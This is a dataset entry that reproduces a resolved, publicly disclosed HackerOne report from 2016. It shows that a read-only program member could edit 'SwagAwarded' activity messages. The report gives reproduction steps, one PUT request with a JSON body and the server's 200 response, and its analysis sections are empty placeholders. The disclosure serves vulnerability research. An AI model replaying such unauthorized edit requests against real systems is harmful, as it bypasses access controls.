---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '118731'
original_report_id: '118731'
title: User with Read-Only permissions can edit the SwagAwarded Activities on Bug
  Reports
weakness: Privilege Escalation
team_handle: security
created_at: '2016-02-25T11:49:13.858Z'
disclosed_at: '2016-04-01T10:58:17.180Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- privilege-escalation
---

# User with Read-Only permissions can edit the SwagAwarded Activities on Bug Reports

## Metadata

- HackerOne Report ID: 118731
- Weakness: Privilege Escalation
- Program: security
- Disclosed At: 2016-04-01T10:58:17.180Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Poc :

1.Login into Program(testbug) as owner account
2.Create a new group with "Reward" Permission . Add a user to that group
3.Create a new group with "Read-only" Permission . Add a user to that group
3.Login into user account Report a bug to Program (testbug)
4."Reward" Permission User awarded a swag with some body of contents
5."Read-only" Permission user able to edit the SwagAwarded Activities on Bug Reports . by following Request 

PUT /activities/812406 HTTP/1.1
<redacted>
Content-Type: application/json
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
<redacted>
Accept-Language: en-US
Accept-Encoding: gzip, deflate
<redacted>

{"id":812406,"is_internal":false,"editable":true,"type":"Activities::SwagAwarded","message":"pieeeeeee lololololololo","markdown_message":"<p>pieeeeeee lololololololo</p>\n","automated_response":false,"created_at":"2016-02-25T11:10:47.137Z","updated_at":"2016-02-25T11:15:18.087Z","actor":{"url":"/s0uq","name":"h1","ibb":false,"profile_picture_urls":{"medium":"/assets/global-elements/add-team-72fa1f23b08270406d1149d06f6968ed.png"}},"reporter":{"username":"demo-researcher","url":"/demo-researcher"}}

Response :

HTTP/1.1 200 OK
Server: cloudflare-nginx
Date: Thu, 25 Feb 2016 11:16:41 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Status: 200 OK
<redacted>

{"id":812406,"is_internal":false,"editable":true,"type":"Activities::SwagAwarded","message":"lololololololo","markdown_message":"\u003cp\u003e lololololololo\u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-25T11:10:47.137Z","updated_at":"2016-02-25T11:15:18.087Z","actor":{"url":"/s0uq","name":"h1","ibb":false,"profile_picture_urls":{"medium":"/assets/global-elements/add-team-72fa1f23b08270406d1149d06f6968ed.png"}}}

Regards,
techguynoob

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
